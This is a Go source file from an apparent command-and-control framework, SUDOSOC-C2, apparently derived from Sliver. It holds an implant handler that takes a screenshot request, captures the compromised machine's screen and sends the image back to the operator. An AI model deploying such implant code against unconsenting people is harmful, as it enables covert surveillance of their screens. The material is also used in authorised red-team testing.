//go:build (linux && (386 || amd64)) || (darwin && (amd64 || arm64)) || (windows && amd64)

package handlers

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2021  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/screen"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"google.golang.org/protobuf/proto"
)

func screenshotHandler(data []byte, resp RPCResponse) {
	sc := &sudosocpb.ScreenshotReq{}
	err := proto.Unmarshal(data, sc)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("Screenshot Request")
	// {{end}}
	scRes := &sudosocpb.Screenshot{}
	scRes.Data = screen.Screenshot()
	data, err = proto.Marshal(scRes)

	resp(data, err)
}
